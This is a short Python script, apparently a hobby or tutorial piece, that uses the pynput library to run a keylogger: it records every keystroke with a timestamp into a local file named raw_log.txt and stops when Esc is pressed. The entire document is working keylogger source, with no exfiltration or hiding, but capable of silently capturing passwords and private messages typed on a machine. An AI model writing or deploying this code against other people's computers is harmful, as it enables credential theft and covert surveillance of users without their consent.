from pynput.keyboard import Listener
import time
import os

log_file = "raw_log.txt"

if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger started at: {}\n".format(time.ctime()))

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key.char))
    except AttributeError:
        with open(log_file, "a") as file:
            file.write("{0} - {1}\n".format(time.ctime(), key))
        
        if key == key.esc:
            return False

with Listener(on_press=on_press) as listener:
    listener.join()
